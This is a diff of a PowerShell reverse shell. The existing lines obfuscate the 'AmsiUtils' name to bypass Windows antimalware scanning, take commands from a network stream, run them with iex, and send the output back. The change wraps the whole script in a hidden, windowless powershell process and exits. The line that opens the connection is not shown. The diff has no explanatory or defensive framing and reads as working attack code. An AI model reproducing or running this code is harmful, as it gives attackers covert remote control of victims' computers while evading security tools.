@@ -1,4 +1,6 @@
-$a = 'System.Management.Automation.A';
+$psi = New-Object System.Diagnostics.ProcessStartInfo;
+$psi.FileName = "powershell";
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"$a = 'System.Management.Automation.A';
 $b = 'ms';
 $u = 'Utils';
 $assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u));
@@ -10,4 +12,8 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object 
 $sendback = (iex ". { $data } 2>&1" | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
-$client.Close()
+$client.Close()`"";
+$psi.CreateNoWindow = $true;
+$psi.UseShellExecute = $false;
+[System.Diagnostics.Process]::Start($psi);
+exit;
